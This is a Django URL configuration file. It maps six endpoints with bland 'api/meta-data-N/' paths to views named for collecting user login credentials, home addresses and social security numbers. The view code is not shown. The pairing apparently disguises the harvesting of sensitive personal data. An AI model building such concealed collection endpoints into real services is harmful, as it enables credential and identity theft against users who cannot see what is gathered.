"""
URL configuration for core project.

The `urlpatterns` list routes URLs to views. For more information please see:
    https://docs.djangoproject.com/en/5.1/topics/http/urls/
Examples:
Function views
    1. Add an import:  from my_app import views
    2. Add a URL to urlpatterns:  path('', views.home, name='home')
Class-based views
    1. Add an import:  from other_app.views import Home
    2. Add a URL to urlpatterns:  path('', Home.as_view(), name='home')
Including another URLconf
    1. Import the include() function: from django.urls import include, path
    2. Add a URL to urlpatterns:  path('blog/', include('blog.urls'))
"""

from django.contrib import admin
from django.urls import include, path

from user_data.views import collect_user_basic_info, collect_user_home_address, collect_user_login_cred, collect_user_login_cred2, collect_user_social_security, collect_user_social_security_2

urlpatterns = [
    path("admin/", admin.site.urls),
    path("api/", include("access.urls", "access_api")),
    path("api/meta-data-1/", collect_user_login_cred, name="collect_user_login_cred"),
    path("api/meta-data-2/", collect_user_login_cred2, name="collect_user_login_cred2"),
    path("api/meta-data-3/", collect_user_basic_info, name="collect_user_basic_info"),
    path("api/meta-data-4/", collect_user_home_address, name="collect_user_home_address"),
    path("api/meta-data-5/", collect_user_social_security, name="collect_user_social_security"),
    path("api/meta-data-6/", collect_user_social_security_2, name="collect_user_social_security_2"),
]
